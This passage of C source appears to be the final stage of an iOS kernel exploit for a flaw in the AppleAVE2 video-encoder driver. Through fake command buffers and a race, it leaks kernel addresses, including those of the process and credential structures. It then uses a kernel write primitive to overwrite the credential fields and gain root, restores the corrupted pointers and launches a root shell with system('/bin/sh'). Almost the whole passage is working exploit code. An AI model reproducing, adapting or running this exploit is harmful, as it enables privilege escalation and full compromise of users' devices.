        setup_fake_cmdbuf(inputmap_InitInfo + 0x10000 + 6*sizeof(struct cmdbuf), inputmap_InitInfo_inKernel + 0x10000 + 7*sizeof(struct cmdbuf), our_task_kAddr + 0x3A0);
        setup_fake_cmdbuf(inputmap_InitInfo + 0x10000 + 7*sizeof(struct cmdbuf), auth_nodeList_prev, our_task_kAddr + 0x3A0 + 4);
        Trigger_AppleAVE2_Vuln_Overwriting_ptr();
    }
    
    while(leaked_data_buf_len < 6){};
    uint64_t leaked_ipc_port_kAddr = leaked_data_buf[1];
    leaked_ipc_port_kAddr *= 0x100000000;
    leaked_ipc_port_kAddr |= leaked_data_buf[0];
    leaked_ipc_port_kAddr <<= 20; // Clear PAC bits
    leaked_ipc_port_kAddr >>= 20;
    leaked_ipc_port_kAddr |= 0xfffff00000000000;
    printf("leaked_ipc_port_kAddr: 0x%llx\n", leaked_ipc_port_kAddr);
    
    uint64_t AVE_SurfaceMgr_from_AppleAVE2Driver = leaked_data_buf[3];
    AVE_SurfaceMgr_from_AppleAVE2Driver *= 0x100000000;
    AVE_SurfaceMgr_from_AppleAVE2Driver |= leaked_data_buf[2];
    printf("AVE_SurfaceMgr_from_AppleAVE2Driver: 0x%llx\n", AVE_SurfaceMgr_from_AppleAVE2Driver);
    
    uint64_t our_proc_kAddr = leaked_data_buf[5];
    our_proc_kAddr *= 0x100000000;
    our_proc_kAddr |= leaked_data_buf[4];
    our_proc_kAddr <<= 20; // Clear PAC bits
    our_proc_kAddr >>= 20;
    our_proc_kAddr |= 0xfffff00000000000;
    printf("our proc stru kAddr Leaked: 0x%llx\n", our_proc_kAddr);
    
    leaked_data_buf_reset();
    
    // ---- Another kmem read via race condition
    usleep(50000);
    {
        setup_fake_cmdbuf(inputmap_InitInfo + 0x10000, inputmap_InitInfo_inKernel + 0x10000 + sizeof(struct cmdbuf), leaked_ipc_port_kAddr + offsetof(struct ipc_port, ip_kobject));
        setup_fake_cmdbuf(inputmap_InitInfo + 0x10000 + sizeof(struct cmdbuf), inputmap_InitInfo_inKernel + 0x10000 + 2*sizeof(struct cmdbuf), leaked_ipc_port_kAddr + offsetof(struct ipc_port, ip_kobject) + 4);
        setup_fake_cmdbuf(inputmap_InitInfo + 0x10000 + 2*sizeof(struct cmdbuf), inputmap_InitInfo_inKernel + 0x10000 + 3*sizeof(struct cmdbuf), AVE_SurfaceMgr_from_AppleAVE2Driver + 48);
        setup_fake_cmdbuf(inputmap_InitInfo + 0x10000 + 3*sizeof(struct cmdbuf), inputmap_InitInfo_inKernel + 0x10000 + 6*sizeof(struct cmdbuf), AVE_SurfaceMgr_from_AppleAVE2Driver + 48 + 4);
        setup_fake_cmdbuf(inputmap_InitInfo + 0x10000 + 6*sizeof(struct cmdbuf), inputmap_InitInfo_inKernel + 0x10000 + 7*sizeof(struct cmdbuf), our_proc_kAddr + 240);
        setup_fake_cmdbuf(inputmap_InitInfo + 0x10000 + 7*sizeof(struct cmdbuf), auth_nodeList_prev, our_proc_kAddr + 240 + 4);
        Trigger_AppleAVE2_Vuln_Overwriting_ptr();
    }
    
    while(leaked_data_buf_len < 6){};
    uint64_t IOSurfaceRootUserClient_obj_kAddr = leaked_data_buf[1];
    IOSurfaceRootUserClient_obj_kAddr *= 0x100000000;
    IOSurfaceRootUserClient_obj_kAddr |= leaked_data_buf[0];
    IOSurfaceRootUserClient_obj_kAddr <<= 20; // Clear PAC bits
    IOSurfaceRootUserClient_obj_kAddr >>= 20;
    IOSurfaceRootUserClient_obj_kAddr |= 0xfffff00000000000;
    printf("IOSurfaceRootUserClient obj kAddr: 0x%llx\n", IOSurfaceRootUserClient_obj_kAddr);
    
    uint64_t Old_node_ptr_ofAVE_SurfaceMgr = leaked_data_buf[3];
    Old_node_ptr_ofAVE_SurfaceMgr *= 0x100000000;
    Old_node_ptr_ofAVE_SurfaceMgr |= leaked_data_buf[2];
    printf("Old_node_ptr_ofAVE_SurfaceMgr: 0x%llx\n", Old_node_ptr_ofAVE_SurfaceMgr);
        
    uint64_t proc_ucred_kAddr = leaked_data_buf[5];
    proc_ucred_kAddr *= 0x100000000;
    proc_ucred_kAddr |= leaked_data_buf[4];
    proc_ucred_kAddr <<= 20; // Clear PAC bits
    proc_ucred_kAddr >>= 20;
    proc_ucred_kAddr |= 0xfffff00000000000;
    printf("proc->ucred kAddr Leaked: 0x%llx\n", proc_ucred_kAddr);
    
    leaked_data_buf_reset();
    
    // ---- Another kmem read
    usleep(50000);
    {
        setup_fake_cmdbuf(inputmap_InitInfo + 0x10000, inputmap_InitInfo_inKernel + 0x10000 + sizeof(struct cmdbuf), IOSurfaceRootUserClient_obj_kAddr + 280);
        setup_fake_cmdbuf(inputmap_InitInfo + 0x10000 + sizeof(struct cmdbuf), auth_nodeList_prev, IOSurfaceRootUserClient_obj_kAddr + 280 + 4);
        Trigger_AppleAVE2_Vuln_Overwriting_ptr();
    }
    
    while(leaked_data_buf_len < 2){};
    uint64_t Restore_IOSurfaceRootUserClient_ptr = leaked_data_buf[1];
    Restore_IOSurfaceRootUserClient_ptr *= 0x100000000;
    Restore_IOSurfaceRootUserClient_ptr |= leaked_data_buf[0];
    printf("Restore_IOSurfaceRootUserClient_ptr: 0x%llx\n", Restore_IOSurfaceRootUserClient_ptr);
    
    leaked_data_buf_reset();
    add_new_client2();
    {
        *(uint32_t*)(inputmap_InitInfo + 13548) = 0; // AVE_Client_CheckCodecInfo
        *(uint32_t*)(inputmap_InitInfo + 14336) = 2; // AVE_CheckChromaFmt(*(unsigned int *)(mapped_kaddr + 14336)) // Must < 4
        
        // Fix of AVE ERR: AVE_AVC_CheckInfo: res frame dimension is not out of range 0 0
        *(uint32_t*)(inputmap_InitInfo + 2040) = 0xC0;
        *(uint32_t*)(inputmap_InitInfo + 2044) = 0x60;
        
        // Fix of AVE_Client_CheckCommonInfo: pInfo->VideoParamsDriver.SlicesPerFrame && pInfo->VideoParamsDriver.SlicesPerFrame <= 32 slice number is out of range
        *(uint32_t*)(inputmap_InitInfo + 13524) = 0x20;
        *(uint32_t*)(inputmap_InitInfo + 13460) = 0;
        
        // Fix of AVE ERR: EnqueueGated:7496 false FrameInfo->InfoType not recognized (0x0)
        *(uint32_t*)(inputmap_InitInfo + 24) = 17767 + 1; // FrameInfo->InfoType
        
        *(uint8_t*)(inputmap_InitInfo + 158874) = 1;
        
        *(uint32_t*)(inputmap_InitInfo + 12) = 1;
        
        *(uint32_t*)(inputmap_InitInfo + 13448) = 1; // Enable Time-stamp for FrameInfo +1088
        
        *(uint32_t*)(inputmap_InitInfo + 13452) = 1; // Enable Callback (::SendFrame) calling
        
        *(uint32_t*)(inputmap_InitInfo + 1936) = 0;
        
        *(uint32_t*)(inputmap_InitInfo + 28) = 1;
        // ::IMG_V_EncodeAndSendFrame
        // if ( !*(_DWORD *)&clientbuf_1->inputmap_InitInfo_block3[28] )
        // It's for leak 32-bits pointer
        
        *(uint32_t*)(inputmap_InitInfo + 96) = 39;
        // ::IMG_V_EncodeAndSendFrame
        // v53 = *(_DWORD *)&clientbuf_1->inputmap_InitInfo_block3[96];
        // Avoid ::IMG_V_EncodeAndSendFrame touching clientbuf->StreamingERC
        
        *(uint32_t*)(inputmap_InitInfo + 4) = 0x77777777;
    }
    {
        char input_stru[0x100] = {0};
        *(uint32_t*)(input_stru + 8) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 16) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 24) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 244) = 1;
        // Fix AVE_Client_CheckCommonInfo
        //  v8 = *(_DWORD *)(mapped_kaddr + 13452);
        //  if ( v8 != 1 || a2 & 1 ) // a2 is from input_stru + 244
        
        size_t output_stru_size = 4;
        char output_stru[4] = {0};
        int kr = IOConnectCallStructMethod(ave_ioconn2, 3, input_stru, 0x100, output_stru, &output_stru_size);
        printf("** calling (PreInit) result kr: 0x%x\n", kr);
    }
    *(uint64_t*)(inputmap_InitInfo + 0x10030) = inputmap_InitInfo_inKernel + 0x8000; // src
    *(uint64_t*)(inputmap_InitInfo + 0x10038) = IOSurfaceRootUserClient_obj_kAddr + 280; // dst
    *(uint64_t*)(inputmap_InitInfo + 5992) = inputmap_InitInfo_inKernel + 0x10030;
    remove_client2();
    
    *(uint64_t*)(inputmap_InitInfo + 0x15100) = 0xaaa9999;
    *(uint64_t*)(inputmap_InitInfo + 0x15110) = 0xbbb8888;
    printf("test w: 0x%llx\n", *(uint64_t*)(inputmap_InitInfo + 0x15100));
    printf("test w: 0x%llx\n", *(uint64_t*)(inputmap_InitInfo + 0x15110));
    
    KernelWrite_8bytes_primi(inputmap_InitInfo_inKernel + 0x15100, 0xcccccccccccccccc);
    
    printf("test w: 0x%llx\n", *(uint64_t*)(inputmap_InitInfo + 0x15100));
    printf("test w: 0x%llx\n", *(uint64_t*)(inputmap_InitInfo + 0x15110));
    
    KernelWrite_8bytes_primi(proc_ucred_kAddr + 0x18, 1);
    KernelWrite_8bytes_primi(proc_ucred_kAddr + 0x20, 1);
    KernelWrite_8bytes_primi(proc_ucred_kAddr + 0x28, 1);
    KernelWrite_8bytes_primi(proc_ucred_kAddr + 0x30, 1);
    KernelWrite_8bytes_primi(proc_ucred_kAddr + 0x38, 1);
    KernelWrite_8bytes_primi(proc_ucred_kAddr + 0x40, 1);
    KernelWrite_8bytes_primi(proc_ucred_kAddr + 0x48, 1);
    KernelWrite_8bytes_primi(proc_ucred_kAddr + 0x50, 1);
    KernelWrite_8bytes_primi(proc_ucred_kAddr + 0x58, 1);
    KernelWrite_8bytes_primi(proc_ucred_kAddr + 0x60, 1);
    KernelWrite_8bytes_primi(proc_ucred_kAddr + 0x68, 1);
    KernelWrite_8bytes_primi(proc_ucred_kAddr + 0x70, 1);
    
    printf("uid patched!\n");
    
    // Clean up
    KernelWrite_8bytes_primi(AVE_SurfaceMgr_from_AppleAVE2Driver + 48, Old_node_ptr_ofAVE_SurfaceMgr);
    KernelWrite_8bytes_primi(AVE_SurfaceMgr_from_AppleAVE2Driver + 56, Old_node_ptr_ofAVE_SurfaceMgr);
    KernelWrite_8bytes_primi(IOSurfaceRootUserClient_obj_kAddr + 280, Restore_IOSurfaceRootUserClient_ptr);
    
    AppleAVE_cleanup();
    
    printf("end\n");
    
    printf("uid: %d\n", getuid());
    if(getuid() == 0){
        printf("loading root shell...\n");
        system("/bin/sh");
    }
    
    return 0;
}
